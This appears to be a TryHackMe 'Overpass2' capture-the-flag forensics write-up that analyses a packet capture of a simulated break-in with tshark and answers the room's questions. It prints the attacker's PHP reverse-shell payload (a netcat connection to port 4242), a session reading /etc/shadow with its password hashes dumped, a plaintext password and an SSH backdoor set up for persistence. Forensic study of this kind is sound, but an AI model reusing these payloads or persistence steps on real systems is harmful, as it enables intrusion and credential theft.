# Overpass2 TryHackme Walkthrough

<p align="center">
  <img width="400" height="400" src="https://github.com/ceortiz33/tryhackme/blob/main/OverPass2/images/overpass2.png">
</p>


## Forensics - Analyze the PCAP
Para esta seccion se utiliza un archivo PCAP que nos entregan como evidencia de un ataque.

```
tshark -r overpass2.pcapng -T fields -e ip.dst | sort | uniq -c
```

```
   1463 140.82.118.4
      2 192.168.170.138
    262 192.168.170.145
   2113 192.168.170.159
      2 192.168.170.2
      1 192.168.170.254
      3 224.0.0.22
      4 224.0.0.251
     14 239.255.255.250
      1 91.189.91.157
```

```
# tshark -r overpass2.pcapng -Y "http"

4 0.000326676 192.168.170.145 → 192.168.170.159 HTTP 484 GET /development/ HTTP/1.1 
    6 0.000860947 192.168.170.159 → 192.168.170.145 HTTP 1078 HTTP/1.1 200 OK  (text/html)
   14 7.915992166 192.168.170.145 → 192.168.170.159 HTTP 1026 POST /development/upload.php HTTP/1.1  (application/x-php)
   16 7.916964256 192.168.170.159 → 192.168.170.145 HTTP 309 HTTP/1.1 200 OK  (text/html)
   18 11.984825193 192.168.170.145 → 192.168.170.159 HTTP 401 GET /development/uploads/ HTTP/1.1 
   19 11.985407246 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
   27 28.574178738 192.168.170.145 → 192.168.170.159 HTTP 466 GET /development/uploads/payload.php HTTP/1.1 
 3562 229.072082387 192.168.170.159 → 192.168.170.145 HTTP 224 GET /cooctus.png HTTP/1.1 
 3585 229.073323788 192.168.170.145 → 192.168.170.159 HTTP 15280 [TCP Spurious Retransmission] HTTP/1.0 200 OK  (PNG)
 3611 235.053124579 192.168.170.159 → 192.168.170.145 HTTP 223 GET /index.html HTTP/1.1 
 3619 235.053836457 192.168.170.145 → 192.168.170.159 HTTP 881 HTTP/1.0 200 OK  (text/html)
 3876 284.434399160 192.168.170.145 → 192.168.170.159 HTTP 472 GET / HTTP/1.1 
 3878 284.434823231 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
 3880 284.443819303 192.168.170.145 → 192.168.170.159 HTTP 347 GET /cooctus.png HTTP/1.1 
 3890 284.444614924 192.168.170.159 → 192.168.170.145 HTTP 14119 HTTP/1.1 200 OK  (PNG)
```

```
# tshark -r overpass2.pcapng --export-object http,/home/kali/Documents/tryhackme/overpass2/exported/
# cd exported
# ls

 %2f  'cooctus(1).png'   cooctus.png   development   index.html  'upload(1).php'   upload.php   uploads
```

```
# nano upload.php

----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--

```

```
for stream in `tshark -r overpass2.pcapng -Y "ip.addr eq 192.168.170.145 and tcp.port eq 4242" -T fields -e tcp.stream | sort -n -u`; do echo Stream: $stream; tshark -r overpass2.pcapng -q -z follow,tcp,ascii,$stream; done
```

```
Stream: 3

===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 3
Node 0: 192.168.170.159:57680
Node 1: 192.168.170.145:4242
55
/bin/sh: 0: can't access tty; job control turned off
$
        3
id

54
uid=33(www-data) gid=33(www-data) groups=33(www-data)

2
$
        47
python3 -c 'import pty;pty.spawn("/bin/bash")'

64
www-data@overpass-production:/var/www/html/development/uploads$
        8
ls -lAh

9
ls -lAh

12
total 8.0K

118
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php

64
www-data@overpass-production:/var/www/html/development/uploads$
        14
cat .overpass

15
cat .overpass

51
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.
64
www-data@overpass-production:/var/www/html/development/uploads$
        9
su james

10
su james

10
Password:
        23
whenevernoteartinstant

2

61
james@overpass-production:/var/www/html/development/uploads$
        5
cd ~

6
cd ~

29
james@overpass-production:~$
        9
sudo -l]

10
sudo -l]

513
sudo: invalid option -- ']'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...

29
james@overpass-production:~$
        8
sudo -l

9
sudo -l

27
[sudo] password for james:
        23
whenevernoteartinstant

2


304
Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$
        21
sudo cat /etc/shadow

22
sudo cat /etc/shadow

1462
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

29
james@overpass-production:~$
        52
git clone https://github.com/NinjaJc01/ssh-backdoor

55
^M<git clone https://github.com/NinjaJc01/ssh-backdoor

32
Cloning into 'ssh-backdoor'...

94
remote: Enumerating objects: 18, done.
remote: Counting objects:   5% (1/18)
1645
remote: Counting objects:  11% (2/18)        ^Mremote: Counting objects:  16% (3/18)        ^Mremote: Counting objects:  22% (4/18)        ^Mremote: Counting objects>
remote: Compressing objects:   6% (1/15)        ^Mremote: Compressing objects:  13% (2/15)        ^Mremote: Compressing objects:  20% (3/15)        ^Mremote: Compres>

34
Unpacking objects:   5% (1/18)
34
Unpacking objects:  11% (2/18)
34
Unpacking objects:  16% (3/18)
34
Unpacking objects:  22% (4/18)
34
Unpacking objects:  27% (5/18)
34
Unpacking objects:  33% (6/18)
34
Unpacking objects:  38% (7/18)
71
remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0

34
Unpacking objects:  44% (8/18)
34
Unpacking objects:  50% (9/18)
35
Unpacking objects:  55% (10/18)
35
Unpacking objects:  61% (11/18)
35
Unpacking objects:  66% (12/18)
35
Unpacking objects:  72% (13/18)
35
Unpacking objects:  77% (14/18)
35
Unpacking objects:  83% (15/18)
35
Unpacking objects:  88% (16/18)
35
Unpacking objects:  94% (17/18)
75
Unpacking objects: 100% (18/18)   ^MUnpacking objects: 100% (18/18), done.

29
james@overpass-production:~$
        16
cd ssh-backdoor

59
cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$
        11
ssh-keygen

12
ssh-keygen

41
Generating public/private rsa key pair.

63
Enter file in which to save the key (/home/james/.ssh/id_rsa):
        7
id_rsa

52
id_rsa
Enter passphrase (empty for no passphrase):
        1


31

Enter same passphrase again:
        1


2


47
Your identification has been saved in id_rsa.

412
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+

42
james@overpass-production:~/ssh-backdoor$
        18
chmod +x backdoor

17
chmod +x backdoor
2


42
james@overpass-production:~/ssh-backdoor$
        143
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

55
^M<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

62
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
2

```


### What was the URL of the page they used to upload a reverse shell?

```
/dev********/
```

### What payload did the attacker use to gain access?

```
&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

### What password did the attacker used to get access?

```
when******************
```

### How did the attacker establish persistence?

```
https://github.com/*********/ssh-backdoor
```

Using the fasttrack wordlist, how many of the system passwords were crackable?

```
*    A value between 2 and 5
```




